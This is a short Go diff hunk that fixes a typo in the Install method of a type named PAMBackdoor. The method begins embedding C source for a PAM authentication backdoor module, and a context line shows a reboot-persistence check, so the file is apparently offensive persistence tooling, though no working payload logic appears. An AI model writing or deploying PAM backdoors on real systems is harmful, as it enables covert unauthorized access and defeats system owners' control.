@@ -34,7 +34,7 @@ func (p *PAMBackdoor) SurvivesReboot() bool {
 	return true
 }
 
-func (p *PAM Backdoor) Install() error {
+func (p *PAMBackdoor) Install() error {
 	// Create PAM backdoor module
 	sourceCode := `#include <security/pam_modules.h>
 #include <string.h>
